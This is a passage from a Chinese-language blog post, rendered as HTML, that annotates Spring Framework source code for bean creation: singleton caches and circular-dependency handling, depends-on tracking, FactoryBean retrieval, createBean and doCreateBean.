function_">getSingleton</span><span class="params">(String beanName, <span class="type">boolean</span> allowEarlyReference)</span> &#123;  </span><br><span class="line">	<span class="comment">// 从 singletonObjects 获取实例，singletonObjects 中缓存的实例都是完全实例化好的 bean，可以直接使用</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">singletonObject</span> <span class="operator">=</span> <span class="built_in">this</span>.singletonObjects.get(beanName);  </span><br><span class="line">    <span class="keyword">if</span> (singletonObject == <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.isSingletonCurrentlyInCreation(beanName)) &#123;  </span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>.singletonObjects) &#123;  </span><br><span class="line">            singletonObject = <span class="built_in">this</span>.earlySingletonObjects.get(beanName);  </span><br><span class="line">            <span class="keyword">if</span> (singletonObject == <span class="literal">null</span> &amp;&amp; allowEarlyReference) &#123;  </span><br><span class="line">                ObjectFactory&lt;?&gt; singletonFactory = (ObjectFactory)<span class="built_in">this</span>.singletonFactories.get(beanName);  </span><br><span class="line">                <span class="keyword">if</span> (singletonFactory != <span class="literal">null</span>) &#123;  </span><br><span class="line">	                <span class="comment">// 加入到三级缓存，暴漏早期对象用于解决循环依赖</span></span><br><span class="line">                    singletonObject = singletonFactory.getObject();  </span><br><span class="line">                    <span class="built_in">this</span>.earlySingletonObjects.put(beanName, singletonObject);  </span><br><span class="line">                    <span class="built_in">this</span>.singletonFactories.remove(beanName);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> singletonObject != NULL_OBJECT ? singletonObject : <span class="literal">null</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>singletonObjects：用于存放初始化好的 bean 实例。这里的bean是已经创建完成的，该bean经历过<strong>实例化-&gt;属性填充-&gt;初始化</strong>以及各类的后置处理。</p>
</li>
<li class="lvl-2">
<p>earlySingletonObjects，用于存放初始化中的 bean，来解决循环依赖。</p>
</li>
<li class="lvl-2">
<p>singletonFactories，用于存放 bean 工厂，bean 工厂所生成的 bean 还没有完成初始化 bean。</p>
</li>
</ul>
<h1>4 depends-on 依赖 Bean</h1>
<blockquote>
<p>AbstractBeanFactory -&gt; isDependent(beanName, dep) -&gt; DefaultSingletonBeanRegistry.class</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//isDependent(beanName, dep)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isDependent</span><span class="params">(String beanName, String dependentBeanName)</span> &#123;  </span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.dependentBeanMap) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.isDependent(beanName, dependentBeanName, (Set)<span class="literal">null</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//transitiveDependency依赖beanName</span></span><br><span class="line"><span class="comment">//如果transitiveDependency被dependentBeanName依赖</span></span><br><span class="line"><span class="comment">//又因为beanName依赖dependentBeanName</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//beanName&lt;-transitiveDependency&lt;-dependentBeanName</span></span><br><span class="line"><span class="comment">//beanName-&gt;dependentBeanName</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isDependent</span><span class="params">(String beanName, String dependentBeanName, Set&lt;String&gt; alreadySeen)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (alreadySeen != <span class="literal">null</span> &amp;&amp; ((Set)alreadySeen).contains(beanName)) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">canonicalName</span> <span class="operator">=</span> <span class="built_in">this</span>.canonicalName(beanName);  </span><br><span class="line">        Set&lt;String&gt; dependentBeans = (Set)<span class="built_in">this</span>.dependentBeanMap.get(canonicalName);  </span><br><span class="line">        <span class="keyword">if</span> (dependentBeans == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dependentBeans.contains(dependentBeanName)) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var6</span> <span class="operator">=</span> dependentBeans.iterator();  </span><br><span class="line">  </span><br><span class="line">            String transitiveDependency;  </span><br><span class="line">            <span class="keyword">do</span> &#123;  </span><br><span class="line">                <span class="keyword">if</span> (!var6.hasNext()) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                transitiveDependency = (String)var6.next();  </span><br><span class="line">                <span class="keyword">if</span> (alreadySeen == <span class="literal">null</span>) &#123;  </span><br><span class="line">                    alreadySeen = <span class="keyword">new</span> <span class="title class_">HashSet</span>();  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                ((Set)alreadySeen).add(beanName);  </span><br><span class="line">            &#125; <span class="keyword">while</span>(!<span class="built_in">this</span>.isDependent(transitiveDependency, dependentBeanName, (Set)alreadySeen));  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//this.registerDependentBean(dep, beanName);</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerDependentBean</span><span class="params">(String beanName, String dependentBeanName)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">canonicalName</span> <span class="operator">=</span> <span class="built_in">this</span>.canonicalName(beanName);  </span><br><span class="line">    Object dependenciesForBean;  </span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.dependentBeanMap) &#123;  </span><br><span class="line">        dependenciesForBean = (Set)<span class="built_in">this</span>.dependentBeanMap.get(canonicalName);  </span><br><span class="line">        <span class="keyword">if</span> (dependenciesForBean == <span class="literal">null</span>) &#123;  </span><br><span class="line">            dependenciesForBean = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>(<span class="number">8</span>);  </span><br><span class="line">            <span class="built_in">this</span>.dependentBeanMap.put(canonicalName, dependenciesForBean);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        ((Set)dependenciesForBean).add(dependentBeanName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.dependenciesForBeanMap) &#123;  </span><br><span class="line">        dependenciesForBean = (Set)<span class="built_in">this</span>.dependenciesForBeanMap.get(dependentBeanName);  </span><br><span class="line">        <span class="keyword">if</span> (dependenciesForBean == <span class="literal">null</span>) &#123;  </span><br><span class="line">            dependenciesForBean = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>(<span class="number">8</span>);  </span><br><span class="line">            <span class="built_in">this</span>.dependenciesForBeanMap.put(dependentBeanName, dependenciesForBean);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        ((Set)dependenciesForBean).add(canonicalName);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>dependentBeanMap：依赖bean的map，即key是被依赖的bean。记录一个bean被多少bean依赖；（该bean被多少bean当做成员变量用@Resource、@Autowired修饰）<br>
dependenciesForBeanMap：bean的依赖，即value是被依赖的bean。记录一个bean依赖了多少bean；（通俗点：一个bean里面有多少个@Atuwowired、@Resource）<br>
<a href="https://segmentfault.com/a/1190000041468353">java - dependentBeanMap和dependenciesForBeanMap的区别 - 个人文章 - SegmentFault 思否</a></p>
<h1>5 getSingleton：获取单实例bean</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (mbd.isSingleton()) &#123;  </span><br><span class="line">    sharedInstance = <span class="built_in">this</span>.getSingleton(beanName, <span class="keyword">new</span> <span class="title class_">ObjectFactory</span>&lt;Object&gt;() &#123;  </span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> BeansException &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> AbstractBeanFactory.<span class="built_in">this</span>.createBean(beanName, mbd, args);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (BeansException var2) &#123;  </span><br><span class="line">                AbstractBeanFactory.<span class="built_in">this</span>.destroySingleton(beanName);  </span><br><span class="line">                <span class="keyword">throw</span> var2;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;);  </span><br><span class="line">    bean = <span class="built_in">this</span>.getObjectForBeanInstance(sharedInstance, name, beanName, mbd);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSingleton</span><span class="params">(String beanName, ObjectFactory&lt;?&gt; singletonFactory)</span> &#123;  </span><br><span class="line">    Assert.notNull(beanName, <span class="string">&quot;&#x27;beanName&#x27; must not be null&quot;</span>);  </span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.singletonObjects) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">singletonObject</span> <span class="operator">=</span> <span class="built_in">this</span>.singletonObjects.get(beanName);  </span><br><span class="line">        <span class="keyword">if</span> (singletonObject == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.singletonsCurrentlyInDestruction) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationNotAllowedException</span>();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="built_in">this</span>.beforeSingletonCreation(beanName);  </span><br><span class="line">            <span class="type">boolean</span> <span class="variable">newSingleton</span> <span class="operator">=</span> <span class="literal">false</span>;  </span><br><span class="line">            <span class="type">boolean</span> <span class="variable">recordSuppressedExceptions</span> <span class="operator">=</span> <span class="built_in">this</span>.suppressedExceptions == <span class="literal">null</span>;  </span><br><span class="line">            <span class="keyword">if</span> (recordSuppressedExceptions) &#123;  </span><br><span class="line">                <span class="built_in">this</span>.suppressedExceptions = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                singletonObject = singletonFactory.getObject();  </span><br><span class="line">                newSingleton = <span class="literal">true</span>;  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalStateException var16) &#123;  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (BeanCreationException var17) &#123;  </span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">                <span class="built_in">this</span>.afterSingletonCreation(beanName);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (newSingleton) &#123;  </span><br><span class="line">                <span class="built_in">this</span>.addSingleton(beanName, singletonObject);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> singletonObject != NULL_OBJECT ? singletonObject : <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建好的bean单例加入singletonObjects</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">addSingleton</span><span class="params">(String beanName, Object singletonObject)</span> &#123;  </span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.singletonObjects) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.singletonObjects.put(beanName, singletonObject != <span class="literal">null</span> ? singletonObject : NULL_OBJECT);  </span><br><span class="line">        <span class="built_in">this</span>.singletonFactories.remove(beanName);  </span><br><span class="line">        <span class="built_in">this</span>.earlySingletonObjects.remove(beanName);  </span><br><span class="line">        <span class="built_in">this</span>.registeredSingletons.add(beanName);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>this.singletonObjects.get(beanName)，先尝试从缓存池中获取对象，没有就继续往下执行</p>
</li>
<li class="lvl-2">
<p>beforeSingletonCreation(beanName)，标记当前 bean 被创建，如果有构造函数注入的循环依赖会报错</p>
</li>
<li class="lvl-2">
<p>singletonObject = singletonFactory.getObject()，创建 bean 过程就是调用 createBean() 方法</p>
</li>
<li class="lvl-2">
<p>afterSingletonCreation(beanName)，最后把标记从集合中移除</p>
</li>
<li class="lvl-2">
<p>addSingleton(beanName, singletonObject)，新创建的会加入缓存集合</p>
</li>
</ul>
<h1>6 FactoryBean 中获取 bean 实例</h1>
<p>getObjectForBeanInstance-&gt;getObjectFromFactoryBean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">getObjectFromFactoryBean</span><span class="params">(FactoryBean&lt;?&gt; factory, String beanName, <span class="type">boolean</span> shouldPostProcess)</span> &#123;  </span><br><span class="line">	<span class="comment">//单例</span></span><br><span class="line">    <span class="keyword">if</span> (factory.isSingleton() &amp;&amp; <span class="built_in">this</span>.containsSingleton(beanName)) &#123;  </span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>.getSingletonMutex()) &#123;  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="built_in">this</span>.factoryBeanObjectCache.get(beanName);  </span><br><span class="line">            <span class="keyword">if</span> (object == <span class="literal">null</span>) &#123;  </span><br><span class="line">                object = <span class="built_in">this</span>.doGetObjectFromFactoryBean(factory, beanName);  </span><br><span class="line">                <span class="type">Object</span> <span class="variable">alreadyThere</span> <span class="operator">=</span> <span class="built_in">this</span>.factoryBeanObjectCache.get(beanName);  </span><br><span class="line">                <span class="keyword">if</span> (alreadyThere != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    object = alreadyThere;  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                    <span class="keyword">if</span> (object != <span class="literal">null</span> &amp;&amp; shouldPostProcess) &#123;  </span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.isSingletonCurrentlyInCreation(beanName)) &#123;  </span><br><span class="line">                            <span class="keyword">return</span> object;  </span><br><span class="line">                        &#125;  </span><br><span class="line">  </span><br><span class="line">                        <span class="built_in">this</span>.beforeSingletonCreation(beanName);  </span><br><span class="line">  </span><br><span class="line">                        <span class="keyword">try</span> &#123;  </span><br><span class="line">                            object = <span class="built_in">this</span>.postProcessObjectFromFactoryBean(object, beanName);  </span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var14) &#123;  </span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(beanName, <span class="string">&quot;Post-processing of FactoryBean&#x27;s singleton object failed&quot;</span>, var14);  </span><br><span class="line">                        &#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">                            <span class="built_in">this</span>.afterSingletonCreation(beanName);  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">  </span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.containsSingleton(beanName)) &#123;  </span><br><span class="line">                        <span class="built_in">this</span>.factoryBeanObjectCache.put(beanName, object != <span class="literal">null</span> ? object : NULL_OBJECT);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> object != NULL_OBJECT ? object : <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//非单例</span></span><br><span class="line">    <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="built_in">this</span>.doGetObjectFromFactoryBean(factory, beanName);  </span><br><span class="line">        <span class="keyword">if</span> (object != <span class="literal">null</span> &amp;&amp; shouldPostProcess) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                object = <span class="built_in">this</span>.postProcessObjectFromFactoryBean(object, beanName);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var17) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(beanName, <span class="string">&quot;Post-processing of FactoryBean&#x27;s object failed&quot;</span>, var17);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> object;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> Object <span class="title function_">doGetObjectFromFactoryBean</span><span class="params">(<span class="keyword">final</span> FactoryBean&lt;?&gt; factory, String beanName)</span> <span class="keyword">throws</span> BeanCreationException &#123;</span><br><span class="line">        Object object;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    object = AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Object&gt;() &#123;</span><br><span class="line">                        <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                            <span class="keyword">return</span> factory.getObject();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;, acc);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (PrivilegedActionException var6) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> var6.getException();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                object = factory.getObject();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (object == <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.isSingletonCurrentlyInCreation(beanName)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCurrentlyInCreationException</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1>7 createBean</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">createBean</span><span class="params">(String beanName, RootBeanDefinition mbd, Object[] args)</span> <span class="keyword">throws</span> BeanCreationException &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isDebugEnabled()) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.logger.debug(<span class="string">&quot;Creating instance of bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">RootBeanDefinition</span> <span class="variable">mbdToUse</span> <span class="operator">=</span> mbd;  </span><br><span class="line">    Class&lt;?&gt; resolvedClass = <span class="built_in">this</span>.resolveBeanClass(mbd, beanName, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);  </span><br><span class="line">    <span class="keyword">if</span> (resolvedClass != <span class="literal">null</span> &amp;&amp; !mbd.hasBeanClass() &amp;&amp; mbd.getBeanClassName() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        mbdToUse = <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(mbd);  </span><br><span class="line">        mbdToUse.setBeanClass(resolvedClass);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        mbdToUse.prepareMethodOverrides();  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (BeanDefinitionValidationException var7) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(mbdToUse.getResourceDescription(), beanName, <span class="string">&quot;Validation of method overrides failed&quot;</span>, var7);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Object beanInstance;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        beanInstance = <span class="built_in">this</span>.resolveBeforeInstantiation(beanName, mbdToUse);  </span><br><span class="line">        <span class="keyword">if</span> (beanInstance != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> beanInstance;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var8) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbdToUse.getResourceDescription(), beanName, <span class="string">&quot;BeanPostProcessor before instantiation of bean failed&quot;</span>, var8);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beanInstance = <span class="built_in">this</span>.doCreateBean(beanName, mbdToUse, args);  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isDebugEnabled()) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.logger.debug(<span class="string">&quot;Finished creating instance of bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> beanInstance;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>8 doCreateBean</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Actually create the specified bean. Pre-creation processing has already happened</span></span><br><span class="line"><span class="comment">	 * at this point, e.g. checking &#123;<span class="doctag">@code</span> postProcessBeforeInstantiation&#125; callbacks.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Differentiates between default bean instantiation, use of a</span></span><br><span class="line"><span class="comment">	 * factory method, and autowiring a constructor.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> beanName the name of the bean</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> mbd the merged bean definition for the bean</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> args explicit arguments to use for constructor or factory method invocation</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> a new instance of the bean</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> BeanCreationException if the bean could not be created</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #instantiateBean</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #instantiateUsingFactoryMethod</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #autowireConstructor</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">protected</span> Object <span class="title function_">doCreateBean</span><span class="params">(String beanName, RootBeanDefinition mbd, <span class="meta">@Nullable</span> Object[] args)</span></span><br><span class="line">			<span class="keyword">throws</span> BeanCreationException &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Instantiate the bean.</span></span><br><span class="line">		<span class="type">BeanWrapper</span> <span class="variable">instanceWrapper</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">if</span> (mbd.isSingleton()) &#123;</span><br><span class="line">			instanceWrapper = <span class="built_in">this</span>.factoryBeanInstanceCache.remove(beanName);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (instanceWrapper == <span class="literal">null</span>) &#123;</span><br><span class="line">			instanceWrapper = createBeanInstance(beanName, mbd, args);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> instanceWrapper.getWrappedInstance();</span><br><span class="line">		Class&lt;?&gt; beanType = instanceWrapper.getWrappedClass();</span><br><span class="line">		<span class="keyword">if</span> (beanType != NullBean.class) &#123;</span><br><span class="line">			mbd.resolvedTargetType = beanType;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Allow post-processors to modify the merged bean definition.</span></span><br><span class="line">		<span class="keyword">synchronized</span> (mbd.postProcessingLock) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!mbd.postProcessed) &#123;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					applyMergedBeanDefinitionPostProcessors(mbd, beanType, beanName);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbd.getResourceDescription(), beanName,</span><br><span class="line">							<span class="string">&quot;Post-processing of merged bean definition failed&quot;</span>, ex);</span><br><span class="line">				&#125;</span><br><span class="line">				mbd.markAsPostProcessed();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Eagerly cache singletons to be able to resolve circular references</span></span><br><span class="line">		<span class="comment">// even when triggered by lifecycle interfaces like BeanFactoryAware.</span></span><br><span class="line">		<span class="type">boolean</span> <span class="variable">earlySingletonExposure</span> <span class="operator">=</span> (mbd.isSingleton() &amp;&amp; <span class="built_in">this</span>.allowCircularReferences &amp;&amp;</span><br><span class="line">				isSingletonCurrentlyInCreation(beanName));</span><br><span class="line">		<span class="keyword">if</span> (earlySingletonExposure) &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">				logger.trace(<span class="string">&quot;Eagerly caching bean &#x27;&quot;</span> + beanName +</span><br><span class="line">						<span class="string">&quot;&#x27; to allow for resolving potential circular references&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			addSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Initialize the bean instance.</span></span><br><span class="line">		<span class="type">Object</span> <span class="variable">exposedObject</span> <span class="operator">=</span> bean;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			populateBean(beanName, mbd, instanceWrapper);</span><br><span class="line">			exposedObject = initializeBean(beanName, exposedObject, mbd);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">			<span class="keyword">if</span> (ex <span class="keyword">instanceof</span> BeanCreationException bce &amp;&amp; beanName.equals(bce.getBeanName())) &#123;</span><br><span class="line">				<span class="keyword">throw</span> bce;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbd.getResourceDescription(), beanName, ex.getMessage(), ex);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (earlySingletonExposure) &#123;</span><br><span class="line">			<span class="type">Object</span> <span class="variable">earlySingletonReference</span> <span class="operator">=</span> getSingleton(beanName, <span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">if</span> (earlySingletonReference != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (exposedObject == bean) &#123;</span><br><span class="line">					exposedObject = earlySingletonReference;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.allowRawInjectionDespiteWrapping &amp;&amp; hasDependentBean(beanName)) &#123;</span><br><span class="line">					String[] dependentBeans = getDependentBeans(beanName);</span><br><span class="line">					Set&lt;String&gt; actualDependentBeans = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;(dependentBeans.length);</span><br><span class="line">					<span class="keyword">for</span> (String dependentBean : dependentBeans) &#123;</span><br><span class="line">						<span class="keyword">if</span> (!removeSingletonIfCreatedForTypeCheckOnly(dependentBean)) &#123;</span><br><span class="line">							actualDependentBeans.add(dependentBean);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (!actualDependentBeans.isEmpty()) &#123;</span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCurrentlyInCreationException</span>();</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Register bean as disposable.</span></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			registerDisposableBeanIfNecessary(beanName, bean, mbd);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (BeanDefinitionValidationException ex) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(</span><br><span class="line">					mbd.getResourceDescription(), beanName, <span class="string">&quot;Invalid destruction signature&quot;</span>, ex);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> 